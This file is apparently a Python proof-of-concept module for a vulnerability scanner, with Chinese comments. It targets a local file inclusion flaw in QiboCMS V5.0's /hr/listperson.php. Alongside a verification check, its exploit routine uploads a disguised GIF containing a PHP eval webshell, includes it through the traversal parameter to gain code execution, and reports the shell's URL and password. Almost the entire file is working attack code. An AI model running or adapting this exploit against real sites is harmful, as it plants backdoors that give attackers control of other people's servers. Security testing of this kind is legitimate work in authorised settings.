# coding: utf-8
import re
import requests
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'QiboCMS_0101'  # 平台漏洞编号，留空
    name = 'QiboCMS V5.0 /hr/listperson.php 本地文件包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI  # 漏洞类型
    disclosure_date = '2015-02-01'  # 漏洞公布时间
    desc = '''
        齐博CMS前身是龙城于大学期间也即2003年所创建的PHP168网站管理系统，它是国内主流CMS系统之一，曾多次被新浪网、腾讯网、凤凰网等多家大型IT媒体报道。齐博CMS目前已有数以万计的用户在使用，覆盖政府、 企业、科研教育和媒体等各个领域。
        Qibocms /hr/listperson.php 系统文件包含致无限制Getshell。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=081470'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'QiboCMS(齐博CMS)'  # 漏洞应用名称
    product_version = 'v5.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'b5d452f0-0657-48f4-b847-7fcacc28281d'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = 'FidTpl[list]=../images/default/default.js'
            file_path = "/hr/listperson.php?%s" % payload
            verify_url = self.target + file_path
            html = requests.get(verify_url).text
            if 'var evt = (evt) ? evt : ((window.event) ? window.event : "");' in html:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            upload_file_url = '%s/hy/choose_pic.php' % self.target
            gif_file = {'postfile': (
                'test.gif', 'Gif89a <?php echo(md5("bb2"));@eval($_POST["bb2"]);', 'image/gif')}
            gif_data = {'action': 'upload'}
            upload_content = requests.post(
                upload_file_url, files=gif_file, data=gif_data).text
            pic_reg = re.compile(
                r"""set_choooooooooooosed\\('\\d+','(.*)','.*'\\);""")
            pic_file = pic_reg.findall(upload_content)
            pic_file = urllib.parse.urlparse((pic_file[0])[:-4]).path
            file_path = "/hr/listperson.php?FidTpl[list]=../%s" % pic_file
            webshell = '%s%s' % (self.target, file_path)
            page_content = requests.get(webshell).text
            if '0c72305dbeb0ed430b79ec9fc5fe8505' in page_content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;获取信息:webshell={webshell},post_password=bb2'.format(
                    target=self.target, name=self.vuln.name, webshell=webshell))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))


if __name__ == '__main__':
    Poc().run()
